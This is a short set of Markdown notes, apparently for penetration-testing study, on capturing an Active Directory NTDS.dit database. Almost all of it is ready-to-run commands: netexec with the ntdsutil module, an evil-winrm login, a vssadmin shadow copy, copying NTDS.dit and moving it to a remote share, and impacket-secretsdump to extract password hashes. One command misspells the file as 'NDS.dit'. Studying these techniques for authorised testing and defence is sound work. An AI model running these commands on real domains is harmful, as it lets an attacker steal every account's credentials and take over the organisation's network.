# Capturing NTDS.dit
- stored in `%systemroot%/ntds`
    
    - .dit (directory information tree)
    
  
## Faster Method: Using Netexec
```Markdown
netexec smb <IP> -u <user> -p <pass> -M ntdsutil
```
- this will do everything in one go
  
## Connecting with Evil-WinRM
```Markdown
evil-winrm -i <IP> -u <user> -p <pass>
```
  
## Checking Local Group Membership
```Markdown
net localgroup
```
- looking to see if they have local admin rights
- if they do, you can copy the NTDS.dit
  
## Copying NTDS.dit
```Markdown
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c move C:\NTDS\NTDS.dit \\<IP>\sharedFolder
```
  
## Extracting Hashes from NTDS.dit
```Markdown
impacket-secretsdump -ntds NDS.dit -system SYSTEM LOCAL
```